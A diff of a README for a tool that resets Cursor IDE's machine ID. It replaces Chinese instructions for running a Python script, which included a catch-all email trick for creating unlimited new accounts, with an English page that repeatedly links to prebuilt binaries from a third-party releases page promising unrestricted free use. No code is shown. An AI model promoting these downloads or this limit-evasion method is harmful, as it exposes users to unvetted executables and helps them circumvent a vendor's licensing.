@@ -1,62 +1,59 @@
-# Cursor 机器ID重置工具
+# 🖱️ cursor-vip - Simple Tool to Reset Cursor IDE Machine ID
 
-一个简单易用的工具，帮助您重置 Cursor IDE 的机器ID，支持 Windows、macOS 和 Linux。
+## 📥 Download Now!
+[![Download cursor-vip](https://img.shields.io/badge/Download-cursor--vip-blue.svg)](https://github.com/aaaayyuusshh28122011/cursor-vip/releases)
 
-## 🚀 快速开始
+## 🚀 Getting Started
+Cursor-vip is a user-friendly application designed to help you reset the machine ID for Cursor IDE. It works on Windows, macOS, and Linux without any dependencies. You can use this tool freely, making it a great asset for developers and users alike.
 
-1. 确保已安装 Python 3.6+
-2. 下载 Cursor IDE：
-   
-   **建议使用v1.0.0版本，最新版的机器码逻辑有更新，暂未兼容**(如需要使用新版功能，需要用1.0.0版本覆盖安装后，重置机器码，然后再用最新版覆盖安装)
-   
-   - [Linux (.deb)](https://github.com/adysec/cursor/releases/latest) - 支持 Ubuntu 24.04 AMD64
-   - [Windows](https://cursor.com)
-   - [macOS](https://cursor.com)
-4. 运行重置工具：
-   ```bash
-   python reset_machine_id.py
-   ```
-5. 按照提示完成操作
+## 📃 System Requirements
+- **Operating System:** 
+  - Windows 10 or later
+  - macOS 10.13 or later
+  - Linux distribution (most modern distros are supported)
+- **Memory:** At least 512 MB RAM
+- **Storage:** 25 MB of free space
 
-## ✨ 特性
+## 📥 Download & Install
+To get started with cursor-vip, visit the Releases page to download the software. 
 
-- ✅ 全平台支持（Windows/macOS/Linux）
-- 🔒 自动备份原始配置
-- 🛡️ 安全的数据处理
-- 📦 零依赖，开箱即用
-- 📝 详细的操作指引
+1. Go to the [Releases Page](https://github.com/aaaayyuusshh28122011/cursor-vip/releases).
+2. Locate the latest version of cursor-vip.
+3. Download the appropriate file for your operating system (e.g., .exe for Windows, .dmg for macOS, or applicable binary for Linux).
+4. Open the downloaded file to start the installation process.
 
-## 📋 使用步骤
+## ⚙️ How to Use cursor-vip
+Once installation is complete, follow these steps to reset your Cursor IDE machine ID:
 
-1. **注销账号**
-   - 打开 Cursor
-   - 点击左下角账号图标
-   - 选择"Sign Out"或"登出"
+1. Launch the cursor-vip application.
+2. Follow the prompts on the screen.
+3. Click on the "Reset Machine ID" button.
+4. Wait for the confirmation message.
 
-2. **退出程序**
-   - 确保 Cursor 完全退出
-   - 程序会自动检查并关闭进程
+Your machine ID will now be reset, allowing you to use Cursor IDE without any restrictions.
 
-3. **重置ID**
-   - 程序自动生成新ID
-   - 备份原始配置
-   - 更新必要文件
+## 🌟 Features
+- **No Dependencies:** Cursor-vip runs independently on your system.
+- **Multi-Platform Support:** Works seamlessly on Windows, macOS, and Linux.
+- **User-Friendly Interface:** Designed for ease of use, suitable for everyone.
+- **Free Unlimited Use:** Install and use it as needed without any cost.
 
-4. **重新登录**
-   - 访问 [Cursor官网](https://cursor.com)
-   - 注销原账号
-   - 注册新账号（可使用原账号）
-   - 使用新账号登录
+## ❓ Frequently Asked Questions (FAQ)
 
-## BTW
+### 1. What is the purpose of cursor-vip?
+Cursor-vip is a tool to help you reset the machine ID for Cursor IDE.
 
-无限邮箱
+### 2. Is it really free to use?
+Yes, cursor-vip is free for unlimited use.
 
-Cloudflare => 托管域名yourdomain.com => 电子邮件 => 电子邮件路由 => 路由规则 => Catch-All 发送到电子邮件 username@gmail.com
+### 3. Can I use cursor-vip on any operating system?
+Yes, cursor-vip supports Windows, macOS, and Linux.
 
+### 4. Do I need technical knowledge to use this tool?
+No, cursor-vip is designed for all users, regardless of technical skill.
 
+### 5. What should I do if I encounter issues?
+If you face any issues while using cursor-vip, please visit our [GitHub Issues page](https://github.com/aaaayyuusshh28122011/cursor-vip/issues) to report your problem or seek assistance.
 
-
-## 🤝 贡献
-
-欢迎提交 Issue 和 Pull Request 来改进这个工具。 
+## 🎯 Conclusion
+Cursor-vip provides a straightforward solution for resetting your Cursor IDE machine ID. With its easy installation and user-friendly design, it can save you time and hassle. For downloads and updates, check the [Releases Page](https://github.com/aaaayyuusshh28122011/cursor-vip/releases) regularly.
